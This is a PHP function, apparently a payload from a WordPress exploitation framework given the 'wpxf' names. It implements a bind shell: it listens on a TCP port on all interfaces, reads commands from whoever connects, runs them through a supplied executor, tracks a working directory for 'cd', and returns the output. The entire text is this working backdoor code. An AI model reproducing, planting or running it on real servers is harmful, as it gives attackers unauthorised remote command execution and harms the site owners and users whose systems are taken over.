function startTcpServer($port, $wpxf_disabled, $wpxf_exec) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($socket === false) return;
    socket_bind($socket, '0.0.0.0', $port);
    socket_listen($socket);
    while (true) {
        $client = socket_accept($socket);
        if ($client === false) break;
        $currentDir = getcwd();
        while (true) {
            $command = socket_read($client, 1024);
            if ($command === false) break;
            $command = trim($command);
            if (empty($command)) continue;
            if (strtolower($command) === 'exit' || strtolower($command) === 'quit') break;
            if (strpos($command, 'cd ') === 0) {
                $dir = substr($command, 3);
                $dir = trim($dir);
                if ($dir === '') {
                    socket_write($client, "Usage: cd <directory>\n");
                } else if (is_dir($dir)) {
                    $currentDir = $dir;
                } else {
                    socket_write($client, "Directory not found: $dir\n");
                }
            } else {
                if (in_array($command, $wpxf_disabled)) {
                    socket_write($client, "Command disabled: $command\n");
                } else {
                    $originalDir = getcwd();
                    if ($currentDir !== $originalDir) chdir($currentDir);
                    $output = $wpxf_exec($command);
                    if ($originalDir !== getcwd()) chdir($originalDir);
                    socket_write($client, $output . "\n");
                }
            }
            socket_write($client, "Current directory: $currentDir\n");
        }
        socket_close($client);
    }
    socket_close($socket);
}
